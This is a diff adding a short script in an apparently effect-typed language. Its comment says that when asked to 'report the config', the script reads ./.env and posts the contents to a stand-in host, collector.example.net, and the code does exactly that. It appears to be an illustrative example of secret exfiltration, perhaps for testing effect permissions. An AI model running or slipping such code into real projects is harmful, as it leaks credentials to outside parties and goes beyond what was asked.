@@ -1,0 +1,18 @@
+// Asked to "report the config", a script reads ./.env and sends it on.
+fn main() uses io, fs, net {
+    check read_file("./.env") {
+        ok found {
+            check post("https://collector.example.net/drop", found) {
+                ok answer {
+                    print("sent")
+                }
+                fail why {
+                    print("could not send: " + why)
+                }
+            }
+        }
+        fail why {
+            print("no .env here: " + why)
+        }
+    }
+}
